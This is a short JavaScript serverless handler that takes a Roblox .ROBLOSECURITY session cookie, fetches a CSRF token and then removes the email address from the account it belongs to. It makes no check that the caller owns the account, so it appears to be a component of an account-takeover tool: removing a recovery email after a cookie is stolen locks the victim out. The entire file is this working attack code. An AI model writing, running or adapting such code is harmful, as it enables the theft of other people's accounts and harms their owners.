export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  const cookie = req.body.cookie;
  if (!cookie || !cookie.includes(".ROBLOSECURITY")) {
    return res.status(400).json({ error: "Missing or invalid cookie" });
  }

  try {
    // Step 1: Get CSRF token
    const csrfRes = await fetch("https://accountinformation.roblox.com/v1/email", {
      method: "POST",
      headers: {
        "Cookie": `.ROBLOSECURITY=${cookie}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({})
    });

    const csrfToken = csrfRes.headers.get("x-csrf-token");
    if (!csrfToken) {
      return res.status(403).json({ error: "Failed to get CSRF token" });
    }

    // Step 2: Make email removal request
    const removeRes = await fetch("https://accountinformation.roblox.com/v1/email", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-CSRF-TOKEN": csrfToken,
        "Cookie": `.ROBLOSECURITY=${cookie}`,
      },
      body: JSON.stringify({})
    });

    if (removeRes.status === 200) {
      return res.status(200).json({ status: "success", message: "Email removed successfully." });
    } else {
      const errorData = await removeRes.json();
      return res.status(removeRes.status).json({ status: "error", message: errorData.errors?.[0]?.message || "Unknown error" });
    }
  } catch (err) {
    console.error("❌ Error:", err);
    return res.status(500).json({ status: "error", message: "Server error." });
  }
}
